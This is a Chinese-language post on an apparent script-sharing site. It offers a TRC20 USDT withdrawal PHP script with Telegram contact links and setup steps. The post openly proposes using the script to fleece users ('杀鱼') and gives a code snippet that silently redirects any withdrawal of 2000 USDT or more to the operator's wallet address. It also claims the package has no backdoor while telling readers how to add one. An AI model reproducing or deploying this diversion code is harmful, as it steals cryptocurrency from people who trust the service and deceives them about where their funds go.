<div id="announcement"><div>
 <h2>重要公告</h2>
    <p>
        加入我们的 Telegram 群组以获取最新消息和支持！ 
        <br>
        📢 <a href="https://t.me/wukongym" target="_blank">点击这里加入 TG 群</a>
        <br><br>
        如需帮助，请联系唯一客服：
        <br>
        🤖 <a href="https://t.me/wukongymw" target="_blank">点击这里联系客服</a>
    </p>
  </div>
</div>

全开源，自己可以修改一下做成收手续费的对接到其他程序

也可以做成杀鱼的接口，免费提供给别人使用，大于多少数量直接秒。。。

具体用途根据自己情况来，全开源无后门的

********************

2024.3.15 免费给终身会员下载

整个文件夹传到服务器后解压出来，访问 域名/timibbsTrc20.php 就可以了

如果需要设置提币大于多少u直接秒，可以在第 73行 后面加上这一段代码：

if(from_balance &gt;= 2000000000){
to = "TUAaMwVhMp9fTxjUhW5qeSKeSdcwR88888";
}

这里的 2000000000 就是 2000usdt ，是数量，合约精度是6位所以后面要加上6个0，想设置为100u则设置为100000000

to = 这里要填自己的地址，意思就是如果提币的地址余额大于等于你设置的数量，则提币收款的地址就变成了你设置的地址

使用方法也很简单，看说明就行，要设置手续费的话就是多了一个转账操作，扣除手续费之后会转出2笔转账，第一笔是扣除了手续费的，第二笔是手续费到你自己的地址，代码就不写了，有需要的直接找我来拿就行

<a href="https://cdn.wukongymw.com/wp-content/uploads/2023/06/1687357214-e3e5e0f95d01e26.png"><img src="https://cdn.wukongymw.com/wp-content/uploads/2023/06/1687357214-e3e5e0f95d01e26.png" width="1777" height="859" class="aligncenter size-full wp-image-199461" style="border-radius:12px; padding:5px; display:block; clear:both; margin:0 auto;"></a>

<!-- ##{"timestamp":1687386184}## -->